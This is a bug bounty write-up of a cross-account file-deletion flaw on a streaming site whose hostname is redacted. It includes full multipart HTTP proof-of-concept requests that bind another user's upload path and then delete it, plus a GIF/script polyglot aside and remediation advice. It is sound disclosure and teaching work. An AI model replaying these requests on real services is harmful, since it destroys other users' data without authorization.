# 🗑️ How I Deleted Other Users’ Files With One Extra Form Field

**Cross-account file delete via a “helpful” client-side path on a live streaming platform**

*by [cyrusthedev](https://github.com/cyrusthedev) · educational writeup · researcher handle: `cyrus__`*

> ⚠️ **Disclosure note.** Target hostnames are replaced with `REDACTED.COM`. This post is for **education**. Only test systems you are authorized to test. I used **my own researcher accounts** for every PoC. Do not point this at random users’ media.

---

## TL;DR

I was hunting a Kick-style live streaming site (PHP / Apache, first-party uploads). While reverse-engineering **Spark Rewards** (channel “gifts” / custom rewards), I noticed `manage_save` happily stored a client-supplied `image_path` when I **didn’t upload a file**.

`manage_delete` then did the moral equivalent of:

```text
unlink("uploads/" + image_path)
```

…with **no check** that the path belonged to me.

So I pointed my own reward at another account’s public avatar path, deleted my reward, and their avatar returned **404**.

**Class:** broken access control / unrestricted file delete (path bind → unlink)  
**Impact:** any logged-in user can wipe other users’ public media under `/uploads/`  
**Not:** RCE, ATO, or file read

---

## 🎯 Why I looked here

The product feels like Kick: channels, chat, emotes, avatars, streamer dashboard. The stack is **not** Kick’s S3 presigned upload flow. Bytes go straight into PHP multipart handlers and land on the app origin:

```text
https://REDACTED.COM/uploads/{avatars|banners|emojis|spark-rewards/...}
```

I wasn’t chasing `robots.txt`. I was chasing the **upload → store → delete** lifecycle — the same mental model as “type / commit / retrieve,” just on PHP instead of S3.

Spark Rewards live in the streamer dashboard (Chat tab). The UI only shows a file picker for the button image. The API is where the interesting fields hide.

---

## 🧩 Mapping the feature

Relevant endpoints:

```http
POST /api/spark.php?action=manage_save
POST /api/spark.php?action=manage_delete
```

Happy path (what the UI does):

1. Multipart upload of a real image  
2. Server writes something like `spark-rewards/{my_user_id}/r_{hash}.png`  
3. DB stores that relative path  
4. Delete removes the reward and unlinks **that** file

I asked a simple question:

> What if I send `image_path` myself and skip the file?

---

## 🧪 The bug in one diagram

```text
[Account B — attacker]
   │
   │  manage_save  (no file)
   │  channel_id = B
   │  image_path = "avatars/<A's public hash>.jpg"
   ▼
[DB]  B's spark reward now points at A's file
   │
   │  manage_delete  reward_id = that reward
   ▼
[FS]  unlink("uploads/avatars/<A's hash>.jpg")   ❌ no ownership check
```

Important control that **works**:

- `channel_id = A` while logged in as B → **`403 forbidden`**

So this is **not** “swap channel_id and you’re admin.”  
The bypass is: **own channel + foreign public path**.

---

## 🔬 Proof of concept (researcher accounts only)

| Role | Meaning |
|------|---------|
| Account A | Victim (my second test user) |
| Account B | Attacker (my first test user) |

### 0) Confirm the victim file is alive

```bash
curl -sI "https://REDACTED.COM/uploads/avatars/<hash>.jpg"
# HTTP/1.1 200 OK
# Content-Type: image/jpeg
# Cache-Control: public, max-age=31536000, immutable
```

> 💡 **Cache tip:** that `immutable` header means a browser tab can still *show* the image after delete. Always verify with `curl -sI` or a private window.

### 1) Bind A’s path onto B’s Spark reward (no file part)

```http
POST /api/spark.php?action=manage_save HTTP/2
Host: REDACTED.COM
Cookie: PHPSESSID=<B_SESSION>
X-CSRF-Token: <CSRF>
Content-Type: multipart/form-data; boundary=----PoCSave
Origin: https://REDACTED.COM

------PoCSave
Content-Disposition: form-data; name="channel_id"

<B_USER_ID>
------PoCSave
Content-Disposition: form-data; name="title"

poc-unlink
------PoCSave
Content-Disposition: form-data; name="cost"

1
------PoCSave
Content-Disposition: form-data; name="is_enabled"

0
------PoCSave
Content-Disposition: form-data; name="effect"

none
------PoCSave
Content-Disposition: form-data; name="image_path"

avatars/<hash>.jpg
------PoCSave
Content-Disposition: form-data; name="telelive_csrf"

<CSRF>
------PoCSave--
```

**Response (abridged):**

```json
{
  "success": true,
  "reward": {
    "id": 183,
    "image_path": "avatars/<hash>.jpg",
    "image_url": "/uploads/avatars/<hash>.jpg"
  }
}
```

The server stored a path **outside** `spark-rewards/<B>/` and still returned success. That’s the smell.

### 2) Control — foreign channel is blocked

Same request with `channel_id=<A_USER_ID>`:

```json
{"success":false,"error":"forbidden"}
```

Good AuthZ on channel ownership. Bad AuthZ on the **file path**.

### 3) Delete B’s reward → unlink A’s file

```http
POST /api/spark.php?action=manage_delete HTTP/2
Host: REDACTED.COM
Cookie: PHPSESSID=<B_SESSION>
X-CSRF-Token: <CSRF>
Content-Type: multipart/form-data; boundary=----PoCDel

------PoCDel
Content-Disposition: form-data; name="channel_id"

<B_USER_ID>
------PoCDel
Content-Disposition: form-data; name="reward_id"

183
------PoCDel
Content-Disposition: form-data; name="telelive_csrf"

<CSRF>
------PoCDel--
```

```json
{"success":true}
```

### 4) Confirm

```bash
curl -sI "https://REDACTED.COM/uploads/avatars/<hash>.jpg"
# HTTP/1.1 404 Not Found
```

Same **404** with `?width=128`.

I also confirmed the same pattern against:

- another avatar PNG  
- a channel banner  
- a spark image under `spark-rewards/<A>/…`

Public paths are everywhere in HTML (`img src="/uploads/..."`). Copy path → bind → delete. Automate if you want. I didn’t need to.

---

## 🧠 Root cause (plain English)

Someone built a convenience field: “already have a path? just send `image_path`.”

That field was treated as **trusted input** on a **destructive** code path.

Two missing checks:

1. **Never accept filesystem paths from the client** for writes that later drive `unlink`.  
2. On delete, `realpath` + jail under `uploads/spark-rewards/{authenticated_user_id}/`.

Channel ID checks alone are not enough when the dangerous object is a **string path**, not the channel row.

---

## 💥 Impact

Any authenticated user can destroy other users’ public media:

| Asset | Example path |
|-------|----------------|
| Avatars | `avatars/{hash}.jpg` |
| Banners | `banners/{hash}.png` |
| Spark art | `spark-rewards/{uid}/r_{hex}.png` |
| Emojis / stories / ads / … | same `/uploads/` tree |

On a streaming platform, silent avatar/banner wipe is integrity loss, support load, and a nasty abuse primitive. Still **not** RCE and **not** reading KYC docs — so I filed it as **High** (sensitive IDOR / integrity), not Critical.

I did **not** test deleting outside `/uploads/` (e.g. path traversal to app code). Don’t do that on a live program without clear rules.

---

## 🛠️ Remediation (what I’d tell the team)

1. Drop client `image_path` / `image_url` entirely. Only the upload handler sets the stored path.  
2. On delete: `realpath`, require prefix `uploads/spark-rewards/{auth_uid}/`, allowlist `r_[hex].(png|gif|webp)`.  
3. Unlink only when nothing else references the file.  
4. Ignore unknown multipart/JSON fields the UI never sends.

---

## 🎓 What I almost chased instead (and why it failed)

While I was in upload-land I also poked GIF polyglots for XSS.

Spark/emoji **do** keep HTML after a GIF trailer (passthrough — not GD-stripped). I had a live file whose bytes literally ended with `<script>alert(…)</script>`.

Direct browse still returned:

```http
Content-Type: image/gif
X-Content-Type-Options: nosniff
Content-Security-Policy: … sandbox
```

Chromium showed a 1×1 GIF. **Zero alerts.**

So: polyglot **storage** ≠ XSS. `nosniff` + correct type saved them. The reportable bug was the **delete path**, not the GIF.

---

## 🧭 Hunting lesson I’m keeping

> When a feature both **stores a path** and later **deletes by that path**, ask:  
> **Who is allowed to choose the path?**

UI file pickers lie. APIs tell the truth. If `image_path` isn’t in the UI, put it in Repeater anyway.

Also: prove impact with **two accounts** and a **HEAD 200 → 404**. Screenshots of a cached browser tab will gaslight you.

---

## Timeline (personal)

- Mapped Spark / upload surface on an authorized program  
- Confirmed path bind + cross-account unlink on researcher media only  
- Wrote the report in the program’s ticket format (short description + PoC screenshots)  
- Published this **redacted** educational version for other hunters

---

## Legal / ethics

- Authorized bug bounty / own test accounts only  
- No third-party streamer media in the PoC  
- Hostnames redacted here as `REDACTED.COM`  
- If you reproduce on a program, follow **their** rules, rate limits, and disclosure policy

---

## Thanks

To every hunter who keeps saying “read the JS / trust the API.” This one was sitting in a multipart field the UI never showed.

— **cyrus__** / [cyrusthedev](https://github.com/cyrusthedev)

---

### Tags

`#bugbounty` `#idor` `#brokenaccesscontrol` `#fileupload` `#unlink` `#websecurity` `#writeup`
